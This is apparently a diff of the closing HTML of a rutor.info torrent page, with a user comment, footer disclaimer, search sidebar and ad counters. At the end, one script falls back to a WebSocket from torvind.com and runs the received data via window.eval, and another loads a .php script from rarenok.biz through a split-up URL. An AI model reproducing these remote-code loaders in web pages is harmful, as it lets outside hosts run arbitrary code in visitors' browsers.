+</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>olegka7373</b></td> <td>17-10-2013 3:47:05 (56 месяцев назад)</td> <td></td> <td align="right"><span id="c_1978988"></span><script type="text/javascript">cOptions(875231,1978988);</script></td></tr><tr><td class="c_t" colspan=4><b>Добавил фильм Путешествие на глубину в 2-х частях</b></td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
